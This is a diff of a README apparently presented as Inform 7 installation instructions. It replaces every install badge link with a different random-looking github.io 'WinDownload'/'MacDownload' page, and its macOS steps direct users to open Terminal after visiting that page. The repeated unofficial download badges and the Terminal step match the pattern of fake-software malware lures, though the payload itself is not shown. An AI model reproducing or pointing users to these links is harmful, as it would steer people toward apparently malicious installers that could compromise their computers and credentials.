@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -61,9 +61,9 @@ Inform 7 is a design system for interactive fiction using a unique natural langu
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Inform 7 is a design system for interactive fiction using a unique natural langu
 
 <div align="center">
 
-[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Inform 7 is a design system for interactive fiction using a unique natural langu
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Inform 7 is a design system for interactive fiction using a unique natural langu
 
 <div align="center">
 
-[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
